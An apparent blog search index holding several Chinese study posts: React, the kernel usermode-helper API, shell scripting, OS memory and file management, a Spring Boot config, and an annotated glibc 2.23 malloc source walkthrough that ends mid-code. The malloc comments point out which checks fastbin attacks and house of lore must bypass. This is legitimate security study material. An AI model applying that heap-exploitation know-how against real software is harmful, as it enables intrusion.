<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[develop-FrontEnd-React-基础]]></title>
    <url>%2Fposts%2Fa03be718%2F</url>
    <content type="text"><![CDATA[0x00React是一个声明式,高效且灵活的用于构建用户界面的JavaScript库.使用React可以将一些简短,独立的代码片段组合成复杂的UI界面,这些代码片段被称作组件. 组件React中拥有多种不同类型的组件.通过使用组件来告诉React要在屏幕上显示什么.当数据发生改变时,React会高效地更新并重新渲染组件. 1234567891011121314class ShoppingList extends React.Component &#123; render() &#123; return ( &lt;div className="shopping-list"&gt; &lt;h1&gt;Shopping List for &#123;this.props.name&#125;&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;Instagram&lt;/li&gt; &lt;li&gt;WhatsApp&lt;/li&gt; &lt;li&gt;Oculus&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; ); &#125;&#125; ShoppingList是一个React组件类,组件参数叫做props,然后通过render方法返回需要展示在屏幕上的视图的层次结构,这是一种对渲染内容的轻量级描述JSX. JSX是一种特殊语法,在JSX中可以任意使用JavaScript表达式,只需要用大括号把表达式括起来. 每一个React元素事实上都是一个JavaScript对象,可以把它当保存在变量中或者作为参数传递.可以通过&lt;ShoppingList /&gt;来表示整个ShoppingList组件.每个组件都是封装好的,并且可以单独运行,通过组合简单的组件来构建复杂的UI界面.]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-Linux-LKM-内核API]]></title>
    <url>%2Fposts%2F3231eb5e%2F</url>
    <content type="text"><![CDATA[0x00记录内核编程中常用的内核API. usermode-helperusermode-helper API中的核心函数. 12345678910call_usermodehelper_setup #准备user-land调用call_usermodehelper_setkeys#设置helper的会话密钥call_usermodehelper_setcleanup#为helper设置一个清空函数call_usermodehelper_stdinpipe#为helper创建stdin管道call_usermodehelper_exec#调用user-land 还有一些简化函数,它们封装了的几个内核函数. 123456call_usermodehelper#准备并调用user-landcall_usermodehelper_pipe#使用stdin管道调用user-landcall_usermodehelper_keys#使用会话密钥调用user-land 核心API使用了一个称为subprocess_info结构的处理函数引用进行操作,该结构(./kernel/kmod.c)集合了给定的usermode-helper实例的所有必需元. 该结构引用从call_usermodehelper_setup调用返回,在call_usermodehelper_setkey,call_usermodehelper_setcleanup以及call_usermodehelper_stdinpipe的调用中进一步配置.通过调用call_usermodehelper_exec来调用配置好的用户模式应用程序. 123456789101112131415161718static int umh_test( void )&#123; struct subprocess_info * sub_info; char * argv[] = &#123;"/usr/bin/logger", "help!", NULL&#125;; static char * envp[] = &#123; "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL &#125;; //return call_usermodehelper( argv[0], argv, envp, UMH_WAIT_PROC ); sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC); if (sub_info == NULL) return -ENOMEM; return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);&#125; 最直接的usermode-helper API应用程序是从内核空间加载内核模块,request_module函数封装对应功能并提供了简单的接口.内核指定一个设备或所需服务并调用request_module来加载模块.通过使用usermode-helper API,模块通过modprobe加载到内核(应用程序通过request_module在用户空间被调用).]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-shell脚本-基础]]></title>
    <url>%2Fposts%2Fa89b8cf0%2F</url>
    <content type="text"><![CDATA[未完成 0x00123456#!/bin/shcd ~for (i = 0;i &lt; 10;i++); do echo $idone 以#开头的行是注释,会被解释器忽略,#!用于告诉操作系统要用什么程序来执行这个脚本. 变量定义变量时,变量名不加$,变量名和等号之间不能有空格,已定义的变量可以被重新定义. 12name="w4rd3n"name="hitworld" 除了显式地直接赋值,还可以用语句给变量赋值. 1for file in `ls` 使用变量要在变量名前面加$,变量名外面的花括号是可选的,加花括号是为了帮助解释器识别变量的边界. 123name="w4rd3n"echo $nameecho $&#123;name&#125; 字符串字符串的定义可以用单引号,也可以用双引号,也可以不用引号. 单引号字符串里的任何字符都会原样输出,包括单引号和转义符. 双引号字符串里可以使用变量和转义字符. 字符串操作1234567891011name="w4rd3n"greeting="hello, "$name"!\n"greeting_1="hello2, $name!\n"echo $greeting$greeting_1echo $greeting $greeting_1echo $&#123;#name&#125;# 获取字符串长度echo $&#123;greeting:1:4&#125;# 提取子字符串]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-ruby-基础]]></title>
    <url>%2Fposts%2F61d4f1b9%2F</url>
    <content type="text"></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>ruby</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operating-system-存储器管理]]></title>
    <url>%2Fposts%2F154e4f3b%2F</url>
    <content type="text"><![CDATA[0x00存储管理的主要功能:内存分配和回收,共享,保护和扩充. 装载与链接程序的装入和链接将一个用户源程序变为一个可在内存中执行的程序,通常要经过:编译,链接,装入. 将一个装入模块装入内存时,可采用三种方式. 绝对装入方式:装入模块中用实际地址,装入预定地方,适用于单道环境. 可重定位方式:装入模块中为相对地址,由可重定位装入程序在装入时一次修改为绝对地址,适用于多道环境,地址变换通常是在装入时一次完成的,以后不再改变该地址,此变换过程称为静态重定位. 动态运行时装入方式:可重定位方式,不允许程序运行时在内存中移动位置,但实际运行中,程序在内存中的位置可能要改变.动态运行时的装入程序,在把装入模块装入内存后,并不立即把装入模块中的相对地址转换为绝对地址,而是把这种地址转换推迟到程序要真正执行时才进行,动态地址重定位.装入内存后的所有地址都仍是相对地址,为使地址转换不影响指令的执行速度,这种方式需要一定的特殊硬件的支持. 程序的链接链接程序的功能,是将经过编译或汇编后所得到的一组目标模块以及它们所需要的库函数,装配成一个完整的装入模块. 实现链接的方法有三种:静态链接,装入时动态链接和运行时动态链接. 静态链接:在将这几个目标模块装配成一个装入模块时,须对相对地址进行修改,变换外部调用符号.链接时,把各目标模块的相对地址修改为统一的以0为始址的线性地址或多维地址空间,外部调用变为相对地址. 装入时动态链接:便于修改和更新,便于实现对目标模块的共享.应用程序在运行时,每次运行的模块无法预计,采用装入时动态链接只能将所有可能要运行的模块全部装入内存. 运行时动态链接:动态链接方式,是将对模块的链接推迟到执行时才执行,亦即,在执行过程中,当发现一个被调用模块尚未装入内存时,立即由OS去找到该模块并将之装入内存,把它链接到调用者模块上.凡在执行过程中未被用到的目标模块,都不会被调入内存和被链接到装入模块上,这样不仅可加快程序的装入过程,而且可节省大量的内存空间. 动态链接库的优点:节省内存;DLL中的函数改变时,不需要重新编译链接;用运行时动态链接可以使本次不用的函数不链接. 连续分配存储管理方式连续分配是指为一个用户程序分配一个连续的内存空间. 单一连续分配这是最简单的一种存储管理方式,但只能用于单用户,单任务的操作系统中. 内存分为以下两个分区:系统区,仅提供给操作系统使用,它可以驻留在内存的低址部分,也可驻留在内存的高址部分,由于中断向量通常驻留在低址部分,故OS通常也驻留在内存的低址部分;用户区,指除系统区以外的全部内存空间,提供给用户使用. 编程时可将作业分成四个段:即代码段,数据段,供程序使用的栈段,以及作为用户工作区的附加段.这几个段的地址空间可以邻接或分开,也可部分或全部重叠.由段寄存器左移4位加偏移值形成物理地址. 固定分区分配固定分区式分配,是最早使用的一种可运行多道程序的存储管理方式.将内存空间划分为若干个固定大小的区域,每个分区大小可相同,也可不同.OS占一区,其余每个分区中可以装入一道作业.为了便于内存分配,系统需建立一张分区使用表.当有一用户程序要装入时,从表中找出一个能满足要求的,尚未分配的分区分配给该程序,然后修改分区使用表. 内存分配:将分区从小到大排队,建立一张分区使用表.当有程序要装入时,检索该表,找出能满足大小的分区,修改分配位.若未找到则失败. 动态分区分配装入和处理过程中建立分区,使其大小和作业大小相等.分区数和大小都可变. 常用数据结构:空闲分区表,内存中每个尚未分配出去的分区设置一个表项(分区号,大小,起始地址,状态);空闲分区链,每个分区首尾,设置一些用于控制分区分配的信息,以及用于链接各分区的指针.状态位0未分配,1已分配. 分区分配算法首次适应算法FF:空闲分区以地址递增的次序链接,分配时,从链首开始顺序查找,找到后,再按照作业的大小,从该分区中划出一块内存空间分配给请求者,余下的空闲分区仍留在空闲链中.优点:先利用内存中低址部分,故留下高址部分的大空闲区.缺点:低址部分留下许多无用留碎片,而每次查找又都从低址部分开始. 循环首次适应算法:是FF的改进,从上次找到的空闲分区的下一个开始查找.优点:该算法能使内存中的空闲分区分布比较均匀,从而减少查找空闲分区的时间.缺点:会缺乏大的空闲分区. 最佳适应算法:空闲分区按其从小到大的顺序链接,顺链找第一个满足要求的空闲区.缺点:会在留下许多难以利用的小空闲块. 分区分配操作用某种分配算法,从空闲分区链(表)中找到所需的分区,若该分区大分为两部分,一部分分配出去,余下的部分仍留在空闲分区链或空闲分区表中,并修改空闲分区链(表),将分配区的首址返回给调用者. 回收内存当一个作业运行完毕释放内存时,系统根据释放区的首地址,从空闲区说明表中找到相应的插入点. 此时可能出现下列四种情况. 回收区不与其他空闲块相连,为回收区单独建立一项新表目,填写回收区的起址和大小,并根据其起址,插入到空闲区说明表的适当位置. 回收区与前一个空闲分区相连时,将回收区与前一个空闲分区合并,不再为回收区分配新的表目,而只需修改前一个空闲分区表目的大小即可. 回收区与后一个空闲分区相连时,将两个空闲区合并,修改后一个空闲分区的表目,把回收区的起址作为新空闲区的起址,大小为两个分区之和. 回收区与前后两个空闲分区都相连时,合并三个分区,用前一个空闲分区表目的起址作为新空闲区的起址,修改其大小为三块分区之和,最后取消后一个空闲分区的表目. 动态重定位分区分配在系统不断地分配和回收中,必定会出现一些不连续的小的空闲区,称为外零头.虽然可能所有零头的总和超过某一个作业的要求,但是由于不连续而无法分配. 解决零头的方法是拼接,即向一个方向移动已分配的作业,使那些零散的小空闲区在另一方向连成一片.分区的拼接技术,一方面是要求能够对作业进行重定位,另一方面系统在拼接时要耗费较多的时间. 动态重定位:允许作业在内存中移动必须硬件(重定位寄存器)支持,执行时,访问的内存地址是相对地址与重定位寄存器中的地址相加而形成的.地址变换过程是在程序执行期间,随着对每条指令和数据的访问而自动进行的,故称为动态重定位. 动态重定位分区分配算法:当请求分配模块找不到足够大的自由分区分给用户时进行紧缩,判断空闲分区总和是否大于请求的大小,是则进行紧凑形成连续空闲区并修改相关数据结构,然后继续正常分配. 分区的存储保护采用上下界限寄存器:OS将分区的上,下界置入上下界寄存器R上,R下,在运行过程中,将作业所形成的每一个访问存储器的物理地址D同上下界限寄存器中的内容相比较,如果不满足则产生地址中断,由OS进行处理. 采用基址限长寄存器:在逻辑地址一端设置一对寄存器实现存储保护,基址寄存器也起重定位的作用,存放该分区的起始地址,限长寄存器存放分配给作业的分区的大小.作业在运行时形成的有效地址(逻辑地址)D,如果不满足则产生地址越界中断. 由于在分区式管理中通常采用界限寄存器作为重定位寄存器和实现存储保护的手段,所以分区管理也称为界地址存储管理. 采用保护键:在IBM 360系统中使用保护键(Protection Key)的存储保护机制.在该系统中,内存分成16块,每块4K字节,每块设一个保护键(0-15).按块分配,一个作业各块相连,并给该作业分配一个键号,填入该作业的各块的保护键中(这个保护键相当于锁);并把该键号置入PSW的保护键字段(相当于钥匙).当程序执行时,如所访问的保护键与钥匙不匹配,则产生保护键违例中断. 对换所谓对换,是指把内存中暂时不能运行的进程或者暂时不用的程序和数据,调出到外存上,以便腾出足够的内存空间,再把已具备运行条件的进程或进程所需要的程序和数据,调入内存.对换是提高内存利用率的有效措施. 为了能对对换区中的空闲盘块进行管理,在系统中应配置相应的数据结构,以记录外存的使用情况.其形式与内存在动态分区分配方式中所用数据结构相似,即同样可以用空闲分区表或空闲分区链.在空闲分区表中的每个表目中应包含两项,即对换区的首址及其大小,它们的单位是盘块号和盘块数. 进程的换出:系统首先选择处于阻塞状态且优先级最低的进程作为换出进程,然后启动盘块,将该进程的程序和数据传送到磁盘的对换区上.若传送过程未出现错误,便可回收该进程所占用的内存空间,并对该进程的进程控制块做相应的修改. 进程的换入:系统应定时地查看所有进程的状态,从中找出就绪状态但已换出的进程,将其中换出时间(换出到磁盘上)最久的进程作为换入进程,将之换入,直至已无可换入的进程或无可换出的进程为止. 基本分页存储管理方式页面与页表页面:页存储管理,是将一个进程的逻辑地址空间分成若干个大小相等的片,称为页面或页.为各页加以编号,从0开始.相应地,也把内存空间分成与页面相同大小的若干个存储块,称为(物理)块或页框(frame),也同样为它们加以编号,如0#块,1#块等等. 在为进程分配内存时,以块为单位将进程中的若干个页分别装入到多个可以不相邻接的物理块中.由于进程的最后一页经常装不满一块而形成了不可利用的碎片,称之为页内碎片. 在分页系统中的页面其大小应适中,且页面大小应是2的幂.页面若太小,一方面虽然可使内存碎片减小,从而减少了内存碎片的总空间,有利于提高内存利用率.但另一方面也会使每个进程占用较多的页面,从而导致进程的页表过长,占用大量内存,此外还会降低页面换进换出的效率. 地址结构对某特定机器,其地址结构是一定的. 对于单级页表,若给定一个逻辑地址空间中的地址为A,页面的大小为L,则页号P为A/L(向下取整),页内地址d为A%L. 两级页表,访问外部页表寄存器获取外部页表地址,通过外部页号获取对应外部页表,再通过外部页内地址和外部页表获取块号和页内地址组成物理地址.多级页表依次类推. 地址变换机构通过逻辑地址的高位获得页号X,通过页表寄存器获取页表的起始地址,访问对应的表项获得块号组成物理地址. 由于页表每次要从磁盘访问,所以有了常驻内存的快表,快表缓存一部分页表项(包括页号和对应的块号),通过输入寄存器获得快表地址. 分段存储管理]]></content>
      <categories>
        <category>CS</category>
        <category>operating-system</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operating-system-文件管理]]></title>
    <url>%2Fposts%2F745d8496%2F</url>
    <content type="text"><![CDATA[文件和文件系统文件,记录和数据项基本数据项:用于描述一个对象的某种属性的字符集,是数据组织中可以命名的最小逻辑数据单位,即原子数据,又称为数据元素或字段.它的命名往往与其属性一致.基本数据项除了数据名外,还应有数据类型.例如,用于描述一个学生的基本数据项有:学号,姓名,年龄,所在班级等. 组合数据项:由若干个基本数据项组成的,简称组项.例如,经理便是个组项,它由正经理和副经理两个基本项组成.又如,工资也是个组项,它可由基本工资,工龄工资和奖励工资等基本项所组成. 记录是一组相关数据项的集合,用于描述一个对象在某方面的属性.一个记录应包含哪些数据项取决于需要描述对象的哪个方面. 文件是指由创建者所定义的,具有文件名的一组相关元素的集合,可分为有结构文件和无结构文件两种.在有结构的文件中,文件由若干个相关记录组成;而无结构文件则被看成是一个字符流.文件在文件系统中是一个最大的数据单位,它描述了一个对象集.例如,可以将一个班的学生记录作为一个文件.文件属性可以包括:文件类型,文件长度,文件的物理位置,文件的建立时间等. 文件类型和文件系统模型文件按用途分类:系统文件,用户文件,库文件.按文件中数据的形式分类:源文件,目标文件,可执行文件.按存取控制属性分类:只执行文件,只读文件,读写文件. 文件系统模型:用户程序访问接口,接口调用对对象操纵和管理的软件集合,程序组合通过定义的对象及其属性操作资源. 对象及其属性:文件管理系统管理的对象有文件,它作为文件管理的直接对象;目录,方便用户对文件的存取和检索,对目录的组织和管理是方便用户和提高对文件存取速度的关键;磁盘(磁带)存储空间,文件和目录必定占用存储空间,对这部分空间的有效管理,不仅能提高外存的利用率,而且能提高对文件的存取速度. 对对象操纵和管理的软件集合:对文件存储空间的管理,对文件目录的管理,用于将文件的逻辑地址转换为物理地址的机制,对文件读和写的管理,以及对文件的共享与保护等功能. 文件系统的接口:文件系统通常向用户提供两种类型的接口,命令接口(touch)和程序接口(open). 文件操作包括创建,删除,读写,截断文件和设置文件的读/写位置等. 打开操作:系统将指名文件的属性(包括该文件在外存上的物理位置)从外存拷贝到内存打开文件表的一个表目中,并将该表目的编号(或称为索引)返回给用户,之后用户通过该索引号对文件提出操作请求. 关闭操作:OS将会把该文件从打开文件表中的表目上删除掉. OS提供其他有关文件操作的系统调用,可将这些调用分成若干类:最常用的一类是有关对文件属性进行操作的,另一类是有关目录的,还有用于实现文件共享的系统调用和用于对文件系统进行操作的系统调用等. 文件的逻辑结构任何一个文件都存在着两种形式的结构:逻辑结构,物理结构(指文件在外存上的存储组织形式). 文件逻辑结构的类型有结构文件:顺序文件(又分为定长记录文件,变长记录文件),索引文件,索引顺序文件. 无结构文件:即流式文件,其长度以字节为单位,对流式文件的访问是采用读写指针来指出下一个要访问的字符,可以把流式文件看作是记录式文件的一个特例.在UNIX系统中所有的文件都被看作是流式文件. 顺序文件第一种是串结构,各记录之间的顺序与关键字无关.通常的办法是由时间来决定,即按存入时间的先后排列,最先存入的记录作为第一个记录,其次存入的为第二个记录,依此类推. 第二种是顺序结构,指文件中的所有记录按关键字(词)排列,可以按关键词的长短从小到大排序,也可以从大到小排序,或按其英文字母顺序排序. 顺序文件的最佳应用场合,是在对诸记录进行批量存取时,也只有顺序文件才能存储在磁带上并能有效地工作. 在交互应用的场合,如果用户(程序)要求查找或修改单个记录,为此系统便要去逐个地查找诸记录.如果是可变长记录的顺序文件,则为查找一个记录所需付出的开销将更大,这就限制了顺序文件的长度. 顺序文件的另一个缺点是,增加或删除一个记录困难.可以为顺序文件配置一个运行记录文件或称为事务文件,把试图增加,删除或修改的信息记录于其中,规定每隔一定时间将运行记录文件与原来的主文件加以合并产生一个按关键字排序的新文件. 对于定长记录文件,如果要查找第i个记录可直接获得第i个记录相对于第一个记录首址的地址.然而,对于可变长度记录的文件,要查找其第i个记录时,须顺序地查找每个记录,从中获得相应记录的长度Li,然后才能计算出第i个记录的首址. 索引文件索引文件通过索引号,长度和指针为表项组成的索引表来索引文件构成一个逻辑结构.索引顺序文件可以通过关键字来索引逻辑地址. 直接文件和哈希文件对于直接文件,则可根据给定的记录键值,直接获得指定记录的物理地址.换言之,记录键值本身就决定了记录的物理地址.这种由记录键值到记录物理地址的转换被称为键值转换,组织直接文件的关键,在于用什么方法进行从记录值到物理地址的转换.哈希文件即将键值转换通过hash算法来实现. 外存分配方式连续分配即分配一片连续的储存空间储存文件.优点,顺序访问容易,速度快.缺点,要求有连续的存储空间,必须事先知道文件的长度. 链接分配一个文件的信息存放在若干不连续的物理块中,各块之间通过指针连接,前一个物理块指向下一个物理块. 隐式链接在文件目录的每个目录项中,都含有指向链接文件的第一个盘块和最后一个盘块的指针,而在每个盘块中都含有指向下一盘块的指针,最后一个盘块指向-1(表示EOF). 优点,可位于离散的磁盘空间,有利于文件插入和删除,有利于文件动态扩充.缺点,存取速度慢,不适于随机存取,可靠性问题,如指针出错. 显式链接把用于链接文件各物理块的指针,显式地存放在一张链接表中,其表项就是下一个块号,文件属性中包含起始块号,通过起始块号访问对应表项知道下一个块号,EOF表示为该文件的最后一个块(原理对比利用数组实现逻辑链表).该表在整个磁盘中只有一张,称之为文件分配表(FAT16,FAT32),文件分配表常驻内存且占用一定的磁盘空间. 索引分配链接分配方式不能支持高效的直接存取,FAT需占用较大的内存空间. 单级索引分配:一个文件的信息存放在若干不连续物理块中,系统为每个文件建立一个专用数据结构索引表,并将这些块的块号存放在一个索引表中.一个索引表就是磁盘块地址数组,其中第i个条目指向文件的第i块.当文件较大时,索引分配优于链接分配方式.当文件较小时,每建立一个文件,需分配一个索引块,索引块利用率极低.也就是保存直接地址. 多级索引分配:将一个大文件的所有索引表(二级索引)的地址放在另一个索引表(一级索引)中,缺点是要多次访问内存.也就是保存间接地址,按索引次数分为一次间接地址,多次间接地址. 混合索引分配方式:即混用单级索引分配和多级索引分配. 目录管理文件控制块和索引结点]]></content>
      <categories>
        <category>CS</category>
        <category>operating-system</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-朝花夕拾]]></title>
    <url>%2Fposts%2F36159cdd%2F</url>
    <content type="text"><![CDATA[0x002020/7/8 Python爬虫之模拟知乎登录—https://juejin.im/post/58dce2248d6d8100613a4cfb。 使用Python读写处理Excel表格—https://blog.csdn.net/Cloudox_/article/details/53812213。 Shell脚本编程30分钟入门—https://github.com/qinjx/30min_guides/blob/master/shell.md#%E4%BD%BF%E7%94%A8%E5%8F%98%E9%87%8F。 深入理解linux系统下proc文件系统内容—https://www.cnblogs.com/cute/archive/2011/04/20/2022280.html。 2020/7/9 内核 API，第 1 部分：从内核调用用户空间应用程序—https://www.ibm.com/developerworks/cn/linux/l-user-space-apps/index.html。 指定初始化—https://blog.csdn.net/comwise/article/details/9087279。 学习React。]]></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>朝花夕拾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-BackEnd-Spring-Boot-基础]]></title>
    <url>%2Fposts%2Fb06301d2%2F</url>
    <content type="text"><![CDATA[未完成 0x00配置文件. 12345#src/main/resources/application.propertiesspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driverspring.datasource.url = jdbc:mysql://localhost:3306/blog?useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=UTC spring.datasource.username = userspring.datasource.password = passwd]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>BackEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-glibc-2.23全面解析]]></title>
    <url>%2Fposts%2F2b513091%2F</url>
    <content type="text"><![CDATA[未完成 0x00基于glibc-2.23,对其采用的堆管理机制与利用方式进行全面解析. malloc首先来看malloc函数的实现,ptmalloc中malloc函数实现为__libc_malloc. 1234567891011121314151617181920212223242526272829typedef struct malloc_state * mstate;//...void * __libc_malloc (size_t bytes) &#123; mstate ar_ptr; //用于保存指向分配区的指针 void * victim; //用于保存获得的mem指针(chunk_addr+0x10) void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); //用于支持程序员对malloc函数进行hook或者用于进程在创建新线程过程中分配内存. arena_get (ar_ptr, bytes); //获取分配区. victim = _int_malloc (ar_ptr, bytes); //_int_malloc执行真正的分配逻辑. if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; //如果分配失败且获取到了分配区,说明该分配区内存空间不足,获取下一个分配区,再次调用_int_malloc.知道无分配区可以分配. if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); //如果此时分配区指针不为空,释放分配区,这里分配已经结束了. assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); //如果指针不为NULL,指针对应的分配区不对应同时该chunk不是mmap分配的,则报错,因为正常情况不可能出现. return victim; //返回mem指针.&#125; _int_malloc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410static void * _int_malloc (mstate av, size_t bytes) &#123; INTERNAL_SIZE_T nb; /* 请求的chunk_size */ unsigned int idx; /* 对应bin数组中的index */ mbinptr bin; /* 指向对应bin的指针 */ mchunkptr victim; /* 指向分配的chunk */ INTERNAL_SIZE_T size; /* 分配的chunk的size */ int victim_index; /* 分配的chunk的bin的index */ mchunkptr remainder; /* 指向分割后剩下的那块chunk */ unsigned long remainder_size; /* 分割后剩下的那块chunk的size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* 一个block值 */ mchunkptr fwd; /* 用于链表操作 */ mchunkptr bck; /* 用于链表操作 */ const char *errstr = NULL; checked_request2size (bytes, nb); /* 计算chunk_size */ /* 无可用的分配区,使用sysmalloc获取内存 */ if (__glibc_unlikely (av == NULL)) &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); //对数据用memset进行处理 return p; &#125; /* 所需的chunk大小小于等于fast bins中的最大chunk大小,首先尝试从fast bins中分配chunk.即使分配区未初始化也是安全的. */ if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; //#define get_max_fast() global_max_fast //要分配的chunk size小于global_max_fast则先从fastbins种寻找 idx = fastbin_index (nb); //通过size获取在fastbins种对应的index mfastbinptr *fb = &amp;fastbin (av, idx); //通过size获取在fastbins种对应的bin mchunkptr pp = *fb; //获取bin的首个chunk do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim); /* 将头指针的下一个chunk作为空闲chunk链表的头部,这里使用lock-free的技术实现.Lock-free算法的基础是CAS(Compareand-Swap)原子操作.避免了ABA问题 */ //此时victim是该fb原来的首个chunk,或者为0 if (victim != 0) &#123; if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) &#123; /* index检测,检测该chunk的size是否符合该bin的index,fastbin attack最大的限制就是该判断,通常通过伪造size或寻找偏移绕过 */ errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; &#125; check_remalloced_chunk (av, victim, nb); /* #if !MALLOC_DEBUG # define check_chunk(A, P) # define check_free_chunk(A, P) # define check_inuse_chunk(A, P) # define check_remalloced_chunk(A, P, N) # define check_malloced_chunk(A, P, N) # define check_malloc_state(A) 非debug模式下这些宏定义为空 */ void *p = chunk2mem (victim); //将chunk指针转化为mem指针,即指向data区域返回给用户使用 alloc_perturb (p, bytes); /* # define __glibc_unlikely(cond) (cond) static int perturb_byte; static void alloc_perturb (char *p, size_t n) &#123; if (__glibc_unlikely (perturb_byte)) memset (p, perturb_byte ^ 0xff, n); &#125; 该函数配合calloc使用 */ return p; //将分配出来的mem指针返回 &#125; //victim为0说明对应fastbin无空闲chunk,继续进行分配 &#125; /* 所需的chunk大小属于small bin */ if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); /* 根据index获得某个small bin的空闲chunk双向循环链表表头 */ if ((victim = last (bin)) != bin) &#123; /* 将表尾赋值给victim,如果victim也就是表尾与表头相同,表示该bin为空 */ if (victim == 0) /* victim为0,表示small bin还没有初始化为双向循环链表,调用malloc_consolidate()函数,此时由于global_max_fast也未初始化,所以会调用malloc_init_state初始化 */ malloc_consolidate (av); else &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) &#123; /* 双向链表检测,house_of_lore中需要绕过该检测 */ errstr = "malloc(): smallbin double linked list corrupted"; goto errout; &#125; set_inuse_bit_at_offset (victim, nb); //设置victim chunk的inuse标志,该标志处于victim chunk的下一个相邻chunk的size字段的第一个bit. bin-&gt;bk = bck; bck-&gt;fd = bin; /* 将victim从small bin的双向循环链表中取出,从small bin中取出一个chunk也可以用unlink()宏函数 */ if (av != &amp;main_arena) /* 如果是非主分配区,将victim chunk的size字段中的表示非主分配区的标志bit清零 */ victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; //同上,正常的分配流程 &#125; &#125; &#125; else &#123; /* 所需的chunk属于large bins,根据chunk的大小获得对应的large bin的index */ idx = largebin_index (nb); if (have_fastchunks (av)) /* 当前分配区的fast bins中存在chunk则调用malloc_consolidate()函数合并fast bins中的chunk,并将这些空闲chunk加入unsorted bin中 */ malloc_consolidate (av); &#125; for (;;) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; /* 反向遍历unsorted bin的双向循环链表,遍历结束的条件是循环链表中只剩下一个头结点. */ bck = victim-&gt;bk; /* 此时bck是unsorted bin链表中最后一个chunk的前一个chunk,也就是倒数第二个chunk */ if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) /* 检查最后一个chunk是否合法,chunk的大小不能小于等于2 * SIZE_SZ,也不能超过该分配区总的内存分配量.在unsorted bin中的空闲chunk的所有标志位都清零了 */ malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av); size = chunksize (victim); /* 获取最后一个chunk的size */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* 用户请求的chunk大小为small bin范围,unsorted bin中只有一个last remainder chunk(即倒数第二个chunk为bin表头),大小大于所需chunk的大小加上MINSIZE */ remainder_size = size - nb; //计算切分后剩余chunk的size remainder = chunk_at_offset (victim, nb); //计算切分后剩余chunk的地址 unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); /* 将剩余chunk加入unsorted bin的链表中并将其作为分配区的last remainder chunk,此时unsorted bin中只有一个chunk */ if (!in_smallbin_range (remainder_size)) &#123; /* 若剩下的chunk属于large bin chunk,将该chunk的fd_nextsize和bk_nextsize设置为NULL */ remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? 